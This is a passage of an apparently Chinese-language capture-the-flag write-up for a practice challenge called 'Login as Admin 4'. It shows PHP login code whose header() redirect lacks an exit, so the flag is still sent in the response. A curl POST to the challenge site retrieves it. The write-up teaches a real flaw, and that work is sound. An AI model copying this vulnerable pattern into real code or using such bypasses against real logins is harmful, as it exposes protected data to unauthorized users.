</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;password&#39;</span>] <span style=color:#ff6ac1>!==</span> <span style=color:#ff5c57>$password</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        <span style=color:#78787e>// show failed message if you input wrong password
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#78787e></span>        header(<span style=color:#5af78e>&#39;Location: ./?failed=1&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#78787e>?&gt;&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>&lt;<span style=color:#ff6ac1>html</span> <span style=color:#57c7ff>lang</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>&lt;<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>charset</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>    &lt;<span style=color:#ff6ac1>title</span>&gt;Login As Admin 4&lt;/<span style=color:#ff6ac1>title</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;viewport&#34;</span> <span style=color:#57c7ff>content</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/bootstrap/css/bootstrap.min.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>&lt;/<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>&lt;<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;jumbotron&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>            &lt;<span style=color:#ff6ac1>h1</span>&gt;Login as Admin 4&lt;/<span style=color:#ff6ac1>h1</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container-fluid&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-header&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>                    &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-brand&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/&#34;</span>&gt;Please Hack Me&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>                &lt;<span style=color:#ff6ac1>ul</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav navbar-nav&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/scoreboard&#34;</span>&gt;Scoreboard&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?show_source=1&#34;</span> <span style=color:#57c7ff>target</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;_blank&#34;</span>&gt;Source Code&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>                &lt;/<span style=color:#ff6ac1>ul</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;col-md-6 col-md-offset-3&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;failed&#39;</span>] <span style=color:#ff6ac1>==</span> <span style=color:#5af78e>&#39;1&#39;</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-danger&#34;</span>&gt;Login failed&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;name&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;admin&#39;</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>/* login success! */</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-success&#34;</span>&gt;&lt;<span style=color:#ff6ac1>code</span>&gt;<span style=color:#78787e>&lt;?</span><span style=color:#ff6ac1>=</span><span style=color:#ff5c57>$flag</span><span style=color:#78787e>?&gt;</span>&lt;/<span style=color:#ff6ac1>code</span>&gt;&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>else</span><span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span>            &lt;<span style=color:#ff6ac1>form</span> <span style=color:#57c7ff>action</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;.&#34;</span> <span style=color:#57c7ff>method</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;POST&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span>&gt;User:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;User&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span>&gt;Pass:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Password&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control btn btn-primary&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;submit&#34;</span> <span style=color:#57c7ff>value</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Login&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span>            &lt;/<span style=color:#ff6ac1>form</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span>&lt;/<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span>&lt;/<span style=color:#ff6ac1>html</span>&gt;
</span></span></code></pre></div><hr><p>這題主要是在講一個觀念「<code>敏感資料不會因為不輸出在頁面上就不被看到</code>」。<br>可以看到在密碼判斷不符合後，設計者使用<code>header()</code>來將使用者重新導向。<br>但之後的程式碼還是會繼續執行，只是因為頁面被導向，所以表面上看不到，只要用一些工具就可以看到了(例如<code>curl</code>)。</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>curl -X POST -d <span style=color:#5af78e>&#34;name=admin&amp;password=password&#34;</span> https://ctf.hackme.quest/login4/
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#78787e>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span>&lt;<span style=color:#ff6ac1>html</span> <span style=color:#57c7ff>lang</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span>&lt;<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>charset</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span>    &lt;<span style=color:#ff6ac1>title</span>&gt;Login As Admin 4&lt;/<span style=color:#ff6ac1>title</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;viewport&#34;</span> <span style=color:#57c7ff>content</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/bootstrap/css/bootstrap.min.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>&lt;/<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>&lt;<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;jumbotron&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>            &lt;<span style=color:#ff6ac1>h1</span>&gt;Login as Admin 4&lt;/<span style=color:#ff6ac1>h1</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container-fluid&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-header&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>                    &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-brand&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/&#34;</span>&gt;Please Hack Me&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>                &lt;<span style=color:#ff6ac1>ul</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav navbar-nav&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/scoreboard&#34;</span>&gt;Scoreboard&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?show_source=1&#34;</span> <span style=color:#57c7ff>target</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;_blank&#34;</span>&gt;Source Code&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>                &lt;/<span style=color:#ff6ac1>ul</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
